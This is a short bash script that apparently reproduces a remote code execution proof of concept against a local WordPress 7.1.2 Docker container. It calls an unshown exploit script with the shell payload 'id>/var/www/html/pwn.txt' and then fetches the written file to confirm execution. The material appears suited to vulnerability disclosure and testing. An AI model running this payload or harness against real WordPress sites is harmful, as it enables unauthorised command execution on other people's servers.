#!/usr/bin/env bash
set -u

PORT=18102
NAME="demo-target-$(date +%s)"
ROOT_DIR="$(cd "$(dirname "$0")" && pwd)"
EXPLOIT_DIR="$ROOT_DIR/exploit"

echo "=== [1/4] start a fresh container with image defaults only ==="
docker run -d --name "$NAME" -p "$PORT:80" wordpress:7.1.2
sleep 7
docker ps --filter "name=$NAME" --format 'status: {{.Status}}   ports: {{.Ports}}'
echo

echo "=== [2/4] run external-only PoC ==="
cd "$EXPLOIT_DIR"
python3 run_ext.py --port "$PORT" --shell 'id>/var/www/html/pwn.txt'
echo

echo "=== [3/4] HTTP proof ==="
curl -s -w "\nHTTP %{http_code}\n" "http://127.0.0.1:$PORT/pwn.txt"
echo

echo "=== [4/4] done; container $NAME left running for inspection ==="
